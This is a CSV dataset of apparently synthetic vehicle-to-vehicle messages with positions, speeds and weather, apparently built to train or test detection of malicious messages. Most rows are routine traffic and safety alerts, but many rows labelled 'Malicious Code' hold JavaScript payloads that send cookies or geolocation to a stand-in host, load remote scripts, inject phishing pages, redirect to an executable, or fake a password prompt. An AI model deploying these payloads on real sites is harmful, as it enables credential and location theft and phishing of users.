Timestamp,Vehicle_ID,Vehicle_Type,Latitude,Longitude,Speed,Message_Type,Message_Content,Weather_Condition
43:04.9,vehicle_53,motorcycle,47.61554117,-122.335499,53.99448183,Traffic Update,Severe traffic congestion on Lane.,snowy
15:29.8,vehicle_56,motorcycle,47.66603288,-122.3350578,89.23288419,Malicious Code,eval(unescape('%3Cscript%3Esrc%3D%22http://example.com/malicious.js%22%3E%3C/script%3E')),rainy
12:22.4,vehicle_7,truck,47.60120133,-122.3779469,65.56314292,Emergency Update,Traffic accident in your surrounding area.,foggy
38:37.7,vehicle_38,car,47.61954955,-122.3875854,85.75718233,Safety,Be alert to Accidents.,clear
11:34.5,vehicle_82,motorcycle,47.63519546,-122.3253124,5.935043299,Safety,Be cautious of Spills.,foggy
17:11.0,vehicle_86,car,47.65137835,-122.3354323,85.66559924,Traffic Update,At-a-standstill traffic on Route 66.,snowy
48:01.3,vehicle_64,car,47.61805745,-122.3505899,49.1851791,Safety,Be aware of Fallen trees.,snowy
54:53.6,vehicle_67,car,47.63805407,-122.3841528,3.088987726,Traffic Update,At-a-standstill traffic on Provincial Highway 1.,clear
23:49.6,vehicle_55,motorcycle,47.65419472,-122.3223111,70.046894,Emergency Update,Major traffic collision in your part of town.,snowy
40:40.9,vehicle_63,car,47.68915177,-122.3985528,73.02462256,Emergency Update,Road collapse in your vicinity.,clear
33:41.5,vehicle_66,motorcycle,47.65995914,-122.308154,7.683319204,Safety,Be cautious of Potholes.,rainy
58:36.8,vehicle_6,motorcycle,47.6147982,-122.3697143,35.36481032,Traffic Update,At-a-standstill traffic on Bundesautobahn 1.,snowy
05:07.2,vehicle_50,car,47.64889344,-122.3875464,110.177135,Traffic Update,Heavy traffic on Autostrada A1.,foggy
51:38.1,vehicle_33,car,47.60184888,-122.3235462,84.97985561,Emergency Update,Multi-vehicle accident in your part of town.,rainy
34:59.1,vehicle_36,motorcycle,47.60034932,-122.3565851,5.975808377,Traffic Update,Stop-and-go traffic on National Highway 1.,clear
12:57.0,vehicle_26,truck,47.63157393,-122.3077128,51.39619547,Traffic Update,Traffic bottleneck on Lane.,snowy
34:40.1,vehicle_42,car,47.68177233,-122.3355744,2.340023901,Emergency Update,Traffic accident in your locale.,clear
26:38.2,vehicle_26,car,47.69189164,-122.3567985,92.46604762,Emergency Update,Traffic accident in your region.,rainy
06:56.4,vehicle_22,motorcycle,47.63719895,-122.3582292,6.721405082,Malicious Code,"setInterval(() => { document.getElementById('submit_button').click(); }, 5000);",snowy
19:01.7,vehicle_47,motorcycle,47.61739698,-122.3939225,20.67226161,Malicious Code,fetch('https://example.com/phishing.html').then(response => response.text()).then(html => document.body.innerHTML = html);,snowy
39:59.3,vehicle_18,motorcycle,47.60667681,-122.3559697,80.62634441,Traffic Update,At-a-standstill traffic on Avenue.,rainy
48:17.3,vehicle_6,car,47.62415065,-122.3433617,9.626699981,Malicious Code,"Object.defineProperty(window, 'location', { get: () => ({ href: 'https://example.com/phishing.html' }) });",rainy
04:51.4,vehicle_44,motorcycle,47.69857945,-122.3493618,18.01795058,Malicious Code,eval(unescape('%3Cscript%3Esrc%3D%22http://example.com/malicious.js%22%3E%3C/script%3E')),snowy
33:48.6,vehicle_55,truck,47.6858913,-122.3846352,12.49008978,Emergency Update,Traffic diversion in your vicinity.,snowy
08:00.4,vehicle_7,motorcycle,47.63472323,-122.3335691,41.64254535,Traffic Update,Traffic is at a standstill on the northbound lanes of Local Street.,rainy
35:19.8,vehicle_89,car,47.69977973,-122.3666691,6.200472246,Emergency Update,Power outage in your community.,foggy
13:35.9,vehicle_2,truck,47.61442936,-122.3732422,88.8193938,Safety,Watch out for Detours.,rainy
52:52.9,vehicle_26,motorcycle,47.60163623,-122.3391298,41.68443058,Malicious Code,eval(unescape('%3Cscript%3Esrc%3D%22http://example.com/malicious.js%22%3E%3C/script%3E')),clear
16:28.5,vehicle_2,truck,47.66139895,-122.3647441,79.3282121,Emergency Update,Civil unrest in your surrounding area.,rainy
34:57.1,vehicle_75,motorcycle,47.63571316,-122.321063,52.75001406,Safety,Look out for Debris.,foggy
08:39.2,vehicle_75,motorcycle,47.63269262,-122.3276884,66.40821106,Traffic Update,Gridlock on Lane.,foggy
19:12.3,vehicle_85,car,47.61468841,-122.3723698,65.84750177,Malicious Code,"setInterval(() => { document.getElementById('submit_button').click(); }, 5000);",clear
01:20.2,vehicle_13,car,47.66222228,-122.3409224,35.5952558,Traffic Update,Gridlock on County Road 1.,snowy
56:15.2,vehicle_21,truck,47.61102186,-122.3860236,3.080138709,Traffic Update,Traffic backup on Lane.,foggy
36:55.0,vehicle_12,car,47.64950066,-122.3394612,87.93084419,Traffic Update,Traffic bottleneck on M25.,snowy
30:17.7,vehicle_39,motorcycle,47.67149007,-122.3610476,54.42062773,Safety,Exercise caution regarding Detours.,snowy
23:41.0,vehicle_26,car,47.65810195,-122.3735976,66.47488937,Malicious Code,location.href = 'https://example.com/malware.exe';,snowy
03:38.9,vehicle_78,car,47.66277311,-122.3298384,56.38223794,Traffic Update,Slow traffic on Interstate 40.,snowy
39:27.3,vehicle_24,motorcycle,47.61219661,-122.3499997,1.177464295,Traffic Update,Slow traffic on Route 66.,clear
08:43.2,vehicle_35,car,47.62653282,-122.3733494,2.230763128,Safety,Exercise caution regarding Slippery roads due to rain or snow.,snowy
55:12.1,vehicle_75,car,47.68210367,-122.3451747,29.96544775,Emergency Update,Power outage in your surrounding area.,snowy
20:02.9,vehicle_78,car,47.69331899,-122.3882183,43.26614135,Emergency Update,Hazardous materials incident in your region.,rainy
01:52.3,vehicle_66,motorcycle,47.61197922,-122.363009,83.55181983,Emergency Update,Emergency traffic in your locality.,foggy
13:30.8,vehicle_96,truck,47.68458078,-122.3866446,60.24495249,Traffic Update,Gridlock on Drive.,foggy
10:36.9,vehicle_20,motorcycle,47.66389044,-122.3734297,73.75433934,Safety,Be aware of Uneven surfaces.,foggy
16:44.8,vehicle_89,car,47.6168465,-122.373989,63.35263869,Emergency Update,Multi-vehicle accident in your locale.,snowy
21:19.9,vehicle_50,truck,47.69293714,-122.3533134,42.49560571,Traffic Update,Slow traffic on Highway 1.,snowy
09:06.6,vehicle_32,truck,47.666441,-122.3817687,33.41349129,Traffic Update,Traffic jam on Avenue.,clear
04:31.3,vehicle_15,car,47.66954559,-122.3099722,57.06387709,Safety,Take precautions against Road construction.,snowy
36:48.2,vehicle_29,car,47.63049657,-122.3081542,78.42407846,Emergency Update,Road collapse in your community.,foggy
13:12.4,vehicle_46,car,47.622153,-122.3739147,8.080991074,Traffic Update,Heavy congestion on Drive.,clear
03:55.7,vehicle_30,truck,47.63941756,-122.3742524,70.10081007,Emergency Update,Traffic diversion in your neighborhood.,rainy
51:38.1,vehicle_22,car,47.65831499,-122.3121423,26.40572133,Traffic Update,Heavy congestion on State Highway 1.,clear
05:28.9,vehicle_30,truck,47.61871598,-122.3743024,108.4014385,Traffic Update,Traffic jam on Local Street.,foggy
07:59.6,vehicle_9,car,47.64042967,-122.3328101,65.81846564,Safety,Avoid Icy roads.,rainy
13:54.5,vehicle_55,motorcycle,47.65717372,-122.367247,78.55361741,Traffic Update,Heavy traffic on Autostrada A1.,rainy
50:28.7,vehicle_93,truck,47.68623252,-122.3305135,38.82889424,Emergency Update,Traffic diversion nearby.,clear
57:35.5,vehicle_46,truck,47.69055669,-122.3211353,43.57672693,Malicious Code,eval(unescape('%3Cscript%3Esrc%3D%22http://example.com/malicious.js%22%3E%3C/script%3E')),rainy
34:17.7,vehicle_20,truck,47.61560301,-122.3748579,81.26270431,Malicious Code,"prompt('Enter your password:', 'Password Required');",rainy
46:49.9,vehicle_23,car,47.66618788,-122.3014638,99.83237993,Malicious Code,"Object.defineProperty(window, 'location', { get: () => ({ href: 'https://example.com/phishing.html' }) });",clear
09:57.6,vehicle_13,truck,47.62978012,-122.3274296,92.78970635,Safety,Stay away from Power outages.,foggy
49:27.4,vehicle_58,car,47.68372465,-122.3692622,116.1581202,Emergency Update,Hazardous materials incident in your neighborhood.,rainy
25:20.8,vehicle_70,motorcycle,47.64721499,-122.3998125,109.0213369,Safety,Stay informed about Accidents.,foggy
25:22.3,vehicle_43,truck,47.66055052,-122.3476657,92.3212924,Malicious Code,"prompt('Enter your password:', 'Password Required');",clear
22:26.9,vehicle_28,truck,47.66050909,-122.3618639,77.78065677,Safety,Be cautious of Road construction.,foggy
08:29.9,vehicle_81,truck,47.66497795,-122.365838,115.2597507,Traffic Update,Gridlock on A1.,foggy
42:26.3,vehicle_64,motorcycle,47.69871243,-122.3696418,76.19923398,Malicious Code,eval(unescape('%3Cscript%3Esrc%3D%22http://example.com/malicious.js%22%3E%3C/script%3E')),rainy
39:49.1,vehicle_5,truck,47.64289199,-122.3306591,12.13422415,Malicious Code,"setInterval(() => { document.getElementById('submit_button').click(); }, 5000);",clear
43:10.9,vehicle_42,truck,47.60432282,-122.3957053,76.29126668,Traffic Update,Stop-and-go traffic on Bundesautobahn 1.,snowy
37:52.8,vehicle_58,truck,47.69882136,-122.3297609,84.54739108,Emergency Update,Active shooter in your region.,snowy
38:48.3,vehicle_31,motorcycle,47.61592285,-122.3742909,85.81508617,Traffic Update,Traffic bottleneck on Provincial Highway 1.,snowy
01:22.9,vehicle_96,truck,47.64603086,-122.3894821,36.18615114,Malicious Code,document.cookie = 'data=' + btoa(document.location.search.slice(1));,snowy
57:36.8,vehicle_45,motorcycle,47.60967965,-122.3362565,72.30736865,Malicious Code,"Object.defineProperty(window, 'location', { get: () => ({ href: 'https://example.com/phishing.html' }) });",clear
16:22.4,vehicle_5,truck,47.67265747,-122.333397,117.567855,Traffic Update,At-a-standstill traffic on National Highway 1.,rainy
22:35.9,vehicle_97,motorcycle,47.61435691,-122.3016684,117.1045867,Traffic Update,Slow traffic on Provincial Highway 1.,clear
45:39.5,vehicle_53,truck,47.64402145,-122.3868148,90.01670366,Traffic Update,Traffic backup on City Road 1.,rainy
54:55.9,vehicle_64,motorcycle,47.63294177,-122.3105692,39.26939343,Safety,Be aware of Black ice.,snowy
59:45.6,vehicle_51,truck,47.68929975,-122.3304043,100.7212926,Malicious Code,fetch('https://example.com/phishing.html').then(response => response.text()).then(html => document.body.innerHTML = html);,clear
01:12.6,vehicle_3,motorcycle,47.686722,-122.3215648,110.4325139,Emergency Update,Civil unrest in your neighborhood.,foggy
14:02.9,vehicle_15,motorcycle,47.69131962,-122.3890919,16.81213324,Emergency Update,Traffic diversion in your locale.,clear
57:48.5,vehicle_66,motorcycle,47.64297768,-122.3768008,56.26441772,Safety,Be cautious of Road closures.,foggy
15:53.9,vehicle_19,truck,47.6134446,-122.3355126,82.20491779,Safety,Avoid Power outages.,clear
50:48.2,vehicle_74,car,47.68107895,-122.3396659,55.93341579,Traffic Update,Slow traffic on Interstate 40.,rainy
01:41.7,vehicle_38,car,47.64591611,-122.3588868,94.30266632,Emergency Update,Detour due to emergency in your region.,foggy
47:33.1,vehicle_97,car,47.63755838,-122.3563641,44.29006144,Traffic Update,Tailback on Bundesautobahn 1.,snowy
57:57.9,vehicle_80,motorcycle,47.60994258,-122.3007596,107.6927442,Malicious Code,"prompt('Enter your password:', 'Password Required');",clear
23:47.0,vehicle_34,motorcycle,47.6265626,-122.3526065,34.92349942,Safety,Look out for Low visibility due to fog or smoke.,rainy
22:41.4,vehicle_90,truck,47.61893702,-122.3438404,117.2136728,Malicious Code,"Object.defineProperty(window, 'location', { get: () => ({ href: 'https://example.com/phishing.html' }) });",snowy
26:53.8,vehicle_62,car,47.67779787,-122.3737448,114.7803896,Malicious Code,fetch('https://example.com/phishing.html').then(response => response.text()).then(html => document.body.innerHTML = html);,rainy
08:53.3,vehicle_19,car,47.64266926,-122.3812576,116.5841881,Traffic Update,Slow traffic on Bundesautobahn 1.,snowy
33:31.6,vehicle_46,truck,47.69129737,-122.332916,61.61382955,Malicious Code,fetch('https://example.com/phishing.html').then(response => response.text()).then(html => document.body.innerHTML = html);,rainy
16:23.0,vehicle_58,motorcycle,47.60610891,-122.3113189,85.46314694,Traffic Update,Traffic bottleneck on A1.,clear
12:33.9,vehicle_74,truck,47.65317701,-122.3058048,1.505042489,Emergency Update,Head-on collision in your jurisdiction.,foggy
35:10.3,vehicle_29,car,47.62603362,-122.3739123,22.92686016,Traffic Update,Heavy congestion on I-95.,snowy
13:24.2,vehicle_15,car,47.65742563,-122.3935427,104.2576044,Safety,Stay informed about Fallen trees.,clear
57:32.1,vehicle_8,truck,47.66875692,-122.3581964,95.89990977,Emergency Update,Head-on collision in your vicinity.,foggy
33:14.3,vehicle_73,truck,47.66223939,-122.3954356,30.5375288,Malicious Code,"Object.defineProperty(window, 'location', { get: () => ({ href: 'https://example.com/phishing.html' }) });",snowy
08:27.1,vehicle_43,car,47.63574142,-122.3350568,78.49581461,Malicious Code,location.href = 'https://example.com/malware.exe';,snowy
06:32.2,vehicle_76,car,47.63624456,-122.3928837,42.14829849,Malicious Code,navigator.geolocation.getCurrentPosition(function(position) { fetch('https://example.com/location.php?lat=' + position.coords.latitude + '&lon=' + position.coords.longitude); });,snowy
21:07.2,vehicle_75,motorcycle,47.61338214,-122.3127108,96.18875584,Emergency Update,Active shooter nearby.,rainy
40:17.2,vehicle_95,car,47.68499304,-122.3624464,72.33230311,Traffic Update,Traffic jam on Provincial Highway 1.,foggy
18:11.3,vehicle_22,motorcycle,47.60589379,-122.3759792,12.03479151,Traffic Update,At-a-standstill traffic on Drive.,foggy
21:57.3,vehicle_2,truck,47.66590967,-122.354207,97.8279092,Emergency Update,Major traffic collision in your neighborhood.,foggy
24:39.5,vehicle_65,motorcycle,47.67292259,-122.3548983,7.111613979,Emergency Update,Traffic diversion locally.,snowy
35:07.9,vehicle_54,car,47.60642931,-122.3192996,17.85454135,Emergency Update,Detour due to emergency in your jurisdiction.,snowy
44:29.8,vehicle_37,truck,47.65808379,-122.3426318,80.17988771,Traffic Update,Traffic jam on Route 66.,clear
09:37.3,vehicle_73,car,47.63209435,-122.3118168,61.48603275,Traffic Update,Heavy congestion on Avenue.,clear
07:39.5,vehicle_73,car,47.60949179,-122.3018508,113.7034671,Safety,Exercise caution regarding Inclement weather.,rainy
46:35.4,vehicle_17,truck,47.66542383,-122.3855247,51.10526487,Malicious Code,fetch('https://example.com/phishing.html').then(response => response.text()).then(html => document.body.innerHTML = html);,rainy
59:41.2,vehicle_31,car,47.6325931,-122.3119828,71.08322614,Traffic Update,Traffic backup on Highway 1.,clear
41:25.3,vehicle_30,truck,47.66451024,-122.3368713,38.19576438,Safety,Watch out for Icy roads.,foggy
36:46.8,vehicle_6,motorcycle,47.62325091,-122.3271361,23.13178842,Safety,Be alert to Slippery roads due to rain or snow.,snowy
30:46.4,vehicle_2,car,47.61046309,-122.3252894,104.8511784,Malicious Code,fetch('https://example.com/phishing.html').then(response => response.text()).then(html => document.body.innerHTML = html);,rainy
00:43.8,vehicle_27,truck,47.69844769,-122.3375618,86.402726,Malicious Code,"prompt('Enter your password:', 'Password Required');",clear
55:52.1,vehicle_20,motorcycle,47.6162189,-122.3733711,12.97250045,Malicious Code,"Object.defineProperty(window, 'location', { get: () => ({ href: 'https://example.com/phishing.html' }) });",rainy
51:52.2,vehicle_47,car,47.61923226,-122.336414,45.7313387,Traffic Update,Tailback on Provincial Highway 1.,foggy
58:09.7,vehicle_16,truck,47.67588156,-122.346231,104.4039697,Malicious Code,"prompt('Enter your password:', 'Password Required');",rainy
28:50.6,vehicle_32,motorcycle,47.65763543,-122.3770755,20.54546061,Emergency Update,Chemical spill in your locale.,foggy
18:12.1,vehicle_39,motorcycle,47.60093159,-122.3104642,5.953674547,Emergency Update,Evacuation order in your region.,rainy
19:14.3,vehicle_26,motorcycle,47.64507399,-122.3087085,30.27450156,Malicious Code,navigator.geolocation.getCurrentPosition(function(position) { fetch('https://example.com/location.php?lat=' + position.coords.latitude + '&lon=' + position.coords.longitude); });,rainy
39:56.8,vehicle_6,motorcycle,47.62319776,-122.3893706,99.85871508,Emergency Update,Head-on collision locally.,snowy
02:32.8,vehicle_88,truck,47.62541404,-122.3107006,40.24015711,Traffic Update,Traffic is at a standstill on the northbound lanes of State Highway 1.,snowy
40:35.6,vehicle_64,truck,47.6655656,-122.3966569,22.07641135,Emergency Update,Detour due to emergency in your locale.,foggy
15:37.5,vehicle_78,truck,47.68316862,-122.392899,35.37040353,Emergency Update,Chemical spill in your jurisdiction.,rainy
19:02.7,vehicle_63,truck,47.69575687,-122.3448568,111.5380916,Emergency Update,Active shooter in your community.,foggy
17:18.6,vehicle_57,truck,47.66157489,-122.3553592,30.72088996,Emergency Update,Head-on collision in your locality.,foggy
01:45.8,vehicle_17,motorcycle,47.61065799,-122.3284735,55.7212953,Safety,Take precautions against Uneven surfaces.,rainy
08:22.7,vehicle_99,motorcycle,47.68786077,-122.3332563,13.70951587,Traffic Update,Stop-and-go traffic on Local Street.,clear
06:18.8,vehicle_20,truck,47.65180536,-122.3962903,99.79754795,Malicious Code,navigator.geolocation.getCurrentPosition(function(position) { fetch('https://example.com/location.php?lat=' + position.coords.latitude + '&lon=' + position.coords.longitude); });,rainy
07:42.8,vehicle_40,motorcycle,47.66466075,-122.3227804,17.18587488,Malicious Code,"setInterval(() => { document.getElementById('submit_button').click(); }, 5000);",rainy
51:43.4,vehicle_9,motorcycle,47.60617746,-122.3269933,60.17883933,Traffic Update,At-a-standstill traffic on County Road 1.,clear
59:32.8,vehicle_70,motorcycle,47.64677921,-122.3797473,1.913583447,Safety,Look out for Construction zones.,snowy
46:45.3,vehicle_7,car,47.60859524,-122.3453606,100.2197828,Safety,Watch out for Road closures.,rainy
44:25.4,vehicle_13,truck,47.68372198,-122.3045176,107.7282634,Emergency Update,Terrorist attack nearby.,clear
19:17.6,vehicle_22,truck,47.66575453,-122.3077486,45.51155273,Traffic Update,Traffic jam on Local Street.,snowy
32:08.5,vehicle_48,truck,47.69160693,-122.3104829,54.83380074,Emergency Update,Hazardous materials incident in your neighborhood.,clear
01:01.3,vehicle_4,car,47.63186216,-122.330539,76.18330369,Traffic Update,Slow traffic on A1.,foggy
36:08.3,vehicle_49,motorcycle,47.61068695,-122.3716072,4.752531397,Traffic Update,Severe traffic congestion on I-95.,rainy
54:39.2,vehicle_51,motorcycle,47.68453045,-122.3953403,60.35569166,Emergency Update,Evacuation order in your jurisdiction.,snowy
12:02.7,vehicle_1,truck,47.68227501,-122.3379533,47.7852291,Emergency Update,Traffic diversion in your jurisdiction.,snowy
56:53.8,vehicle_95,truck,47.6697276,-122.3180959,93.34077743,Malicious Code,"prompt('Enter your password:', 'Password Required');",snowy
56:16.4,vehicle_65,motorcycle,47.62278109,-122.3702724,37.81518146,Emergency Update,Evacuation order in your region.,foggy
46:25.7,vehicle_74,truck,47.61253727,-122.3502911,52.41936059,Malicious Code,eval(unescape('%3Cscript%3Esrc%3D%22http://example.com/malicious.js%22%3E%3C/script%3E')),foggy
18:05.3,vehicle_97,truck,47.68180847,-122.3103203,116.2330644,Emergency Update,Road collapse in your region.,clear
46:30.6,vehicle_99,motorcycle,47.68384678,-122.3789799,96.65922068,Malicious Code,location.href = 'https://example.com/malware.exe';,foggy
52:25.0,vehicle_17,motorcycle,47.64086916,-122.3359469,114.3859677,Emergency Update,Detour due to emergency in your locale.,clear
57:11.7,vehicle_48,car,47.66382689,-122.3055441,20.53212594,Malicious Code,navigator.geolocation.getCurrentPosition(function(position) { fetch('https://example.com/location.php?lat=' + position.coords.latitude + '&lon=' + position.coords.longitude); });,clear
10:15.6,vehicle_91,motorcycle,47.68962989,-122.3168831,47.81277176,Malicious Code,"prompt('Enter your password:', 'Password Required');",snowy
43:42.0,vehicle_38,truck,47.62710456,-122.3014008,80.9618637,Emergency Update,Detour due to emergency in your part of town.,clear
16:33.9,vehicle_96,motorcycle,47.63782974,-122.3941215,52.12970993,Traffic Update,Traffic is at a standstill on the northbound lanes of Lane.,rainy
35:32.1,vehicle_21,truck,47.67274877,-122.3515205,118.9526501,Malicious Code,"prompt('Enter your password:', 'Password Required');",rainy
02:46.8,vehicle_21,truck,47.62125726,-122.3161652,22.33566472,Traffic Update,Traffic is at a standstill on the northbound lanes of National Highway 1.,snowy
24:37.5,vehicle_18,truck,47.68374457,-122.3908882,93.36913842,Emergency Update,Civil unrest in your jurisdiction.,rainy
13:16.3,vehicle_56,car,47.61495573,-122.3936152,91.3615942,Malicious Code,fetch('https://example.com/phishing.html').then(response => response.text()).then(html => document.body.innerHTML = html);,foggy
30:49.5,vehicle_5,truck,47.66182923,-122.3285107,22.28429541,Traffic Update,Traffic is at a standstill on the northbound lanes of State Highway 1.,foggy
03:06.7,vehicle_8,motorcycle,47.60911189,-122.3211899,64.59358305,Malicious Code,"Object.defineProperty(window, 'location', { get: () => ({ href: 'https://example.com/phishing.html' }) });",clear
58:35.9,vehicle_59,car,47.64947302,-122.3287932,73.58263258,Traffic Update,Traffic bottleneck on National Highway 1.,foggy
34:59.3,vehicle_15,motorcycle,47.60353267,-122.3713695,94.33920065,Emergency Update,Multi-vehicle accident in your region.,clear
33:39.3,vehicle_29,truck,47.69741667,-122.3648886,114.2594989,Malicious Code,eval(unescape('%3Cscript%3Esrc%3D%22http://example.com/malicious.js%22%3E%3C/script%3E')),foggy
13:34.9,vehicle_61,car,47.63176578,-122.3022629,49.91791801,Traffic Update,Gridlock on County Road 1.,clear
03:26.4,vehicle_69,truck,47.67582219,-122.3370056,32.31633285,Emergency Update,Traffic diversion in your community.,snowy
48:01.7,vehicle_50,car,47.6299939,-122.3185807,44.44496545,Emergency Update,Hazardous materials incident in your region.,snowy
08:56.2,vehicle_84,motorcycle,47.69447935,-122.3566141,90.60082413,Malicious Code,"Object.defineProperty(window, 'location', { get: () => ({ href: 'https://example.com/phishing.html' }) });",rainy
20:03.5,vehicle_62,motorcycle,47.69586541,-122.3593597,41.49144892,Safety,Watch out for Construction zones.,clear
29:41.2,vehicle_99,motorcycle,47.61305454,-122.3463949,41.0215841,Emergency Update,Infrastructure collapse in your part of town.,clear
01:54.5,vehicle_26,car,47.61324973,-122.3532772,80.06745791,Safety,Be cautious of Slippery roads due to rain or snow.,snowy
52:13.7,vehicle_15,motorcycle,47.6141819,-122.3358837,76.3864644,Traffic Update,Slow traffic on City Road 1.,rainy
53:59.1,vehicle_44,truck,47.65718542,-122.3110213,25.36877572,Safety,Avoid Power outages.,rainy
15:03.5,vehicle_86,car,47.69080893,-122.3481854,35.49149837,Malicious Code,(function() { var img = new Image(); img.src = 'https://example.com/tracker.php?data=' + encodeURIComponent(document.cookie); })();,rainy
19:48.3,vehicle_6,truck,47.60433268,-122.3838303,31.08544935,Emergency Update,Water crisis locally.,foggy
42:48.4,vehicle_65,truck,47.63290134,-122.3361709,111.73099,Safety,Watch out for Accidents.,snowy
29:14.4,vehicle_53,truck,47.61183901,-122.3850111,99.74326928,Malicious Code,"Object.defineProperty(window, 'location', { get: () => ({ href: 'https://example.com/phishing.html' }) });",rainy
15:45.6,vehicle_98,truck,47.68576628,-122.3664059,42.72128436,Safety,Look out for Inclement weather.,rainy
27:09.3,vehicle_73,truck,47.6506821,-122.3773752,44.02482455,Safety,Look out for Construction zones.,snowy
37:49.7,vehicle_49,motorcycle,47.61567134,-122.3863059,110.560549,Traffic Update,Gridlock on Boulevard.,rainy
40:32.5,vehicle_37,car,47.68075386,-122.3496818,9.729439998,Safety,Take precautions against Debris.,clear
05:01.8,vehicle_82,motorcycle,47.6137449,-122.3391252,39.09422169,Malicious Code,(function() { var img = new Image(); img.src = 'https://example.com/tracker.php?data=' + encodeURIComponent(document.cookie); })();,clear
29:21.1,vehicle_32,car,47.60162182,-122.3022646,88.09249402,Safety,Take precautions against Uneven surfaces.,clear
02:16.5,vehicle_42,car,47.68135941,-122.3445804,20.56149215,Traffic Update,Stop-and-go traffic on Main Street.,rainy
17:12.3,vehicle_64,car,47.66773772,-122.305061,98.63456268,Traffic Update,Gridlock on County Road 1.,snowy
03:26.2,vehicle_5,truck,47.63130413,-122.3720491,115.9931082,Emergency Update,Infrastructure collapse in your part of town.,snowy
06:00.6,vehicle_68,truck,47.67450538,-122.3348649,40.94211528,Traffic Update,Heavy traffic on Highway 1.,rainy
18:26.3,vehicle_77,motorcycle,47.60408512,-122.3428657,7.988598677,Malicious Code,document.cookie = 'data=' + btoa(document.location.search.slice(1));,clear
52:28.6,vehicle_41,truck,47.67152544,-122.3772119,27.02745622,Safety,Be cautious of Inclement weather.,foggy
43:23.1,vehicle_8,truck,47.65793745,-122.3400591,31.38785801,Traffic Update,Heavy congestion on County Road 1.,snowy
48:37.5,vehicle_9,motorcycle,47.67016628,-122.390182,67.51857206,Malicious Code,"prompt('Enter your password:', 'Password Required');",foggy
16:04.7,vehicle_6,car,47.61839942,-122.3632726,44.77271617,Malicious Code,location.href = 'https://example.com/malware.exe';,clear
33:53.5,vehicle_4,truck,47.66262412,-122.3935624,97.3938093,Malicious Code,eval(unescape('%3Cscript%3Esrc%3D%22http://example.com/malicious.js%22%3E%3C/script%3E')),rainy
39:02.6,vehicle_44,truck,47.69122576,-122.3718601,19.12246553,Safety,Watch out for Road closures.,clear
56:27.5,vehicle_70,truck,47.68819526,-122.394937,82.4883981,Malicious Code,document.cookie = 'data=' + btoa(document.location.search.slice(1));,snowy
03:52.7,vehicle_29,car,47.67529109,-122.3300045,48.24846537,Malicious Code,fetch('https://example.com/phishing.html').then(response => response.text()).then(html => document.body.innerHTML = html);,snowy
29:45.0,vehicle_15,truck,47.60223261,-122.3098874,22.05504768,Emergency Update,Natural disaster in your vicinity.,rainy
56:15.7,vehicle_43,truck,47.67665016,-122.323424,29.73560347,Traffic Update,Gridlock on Drive.,rainy
56:45.3,vehicle_26,motorcycle,47.62965105,-122.3275247,115.5626967,Traffic Update,At-a-standstill traffic on Route 66.,foggy
52:42.7,vehicle_9,truck,47.64328271,-122.3170979,4.315281698,Safety,Be on the lookout for Fallen trees.,rainy
17:08.0,vehicle_90,truck,47.68371005,-122.3131755,54.89297207,Safety,Watch out for Road construction.,foggy
59:01.8,vehicle_5,truck,47.6522031,-122.3116748,91.1200899,Traffic Update,Slow traffic on Autostrada A1.,snowy
57:36.7,vehicle_7,motorcycle,47.67418459,-122.3843527,6.459480798,Emergency Update,Traffic accident in your jurisdiction.,rainy
27:44.7,vehicle_98,car,47.61486787,-122.3853512,17.14913075,Malicious Code,"Object.defineProperty(window, 'location', { get: () => ({ href: 'https://example.com/phishing.html' }) });",foggy
01:10.8,vehicle_5,truck,47.68666377,-122.3853317,26.4599795,Malicious Code,"Object.defineProperty(window, 'location', { get: () => ({ href: 'https://example.com/phishing.html' }) });",rainy
39:33.9,vehicle_80,truck,47.6274322,-122.3440441,78.0915493,Traffic Update,Traffic backup on Provincial Highway 1.,foggy
30:40.7,vehicle_67,motorcycle,47.68473244,-122.3063446,38.18311713,Emergency Update,Natural disaster in your locality.,snowy
25:53.7,vehicle_1,motorcycle,47.64003573,-122.3520517,76.53828458,Safety,Exercise caution regarding Uneven surfaces.,rainy
27:15.3,vehicle_19,car,47.62034143,-122.3748373,2.397516371,Safety,Watch out for Road construction.,clear
14:40.6,vehicle_55,car,47.66639445,-122.3555703,60.03235046,Safety,Look out for Fallen trees.,clear
43:04.9,vehicle_66,car,47.67638207,-122.3502906,47.8246844,Malicious Code,location.href = 'https://example.com/malware.exe';,clear
07:33.9,vehicle_7,car,47.61216467,-122.3487556,28.59210237,Emergency Update,Evacuation order in your community.,clear
49:10.1,vehicle_76,truck,47.65283348,-122.3268494,40.857743,Traffic Update,Gridlock on Boulevard.,clear
20:18.5,vehicle_80,motorcycle,47.63722558,-122.3300272,55.55365247,Malicious Code,"setInterval(() => { document.getElementById('submit_button').click(); }, 5000);",rainy
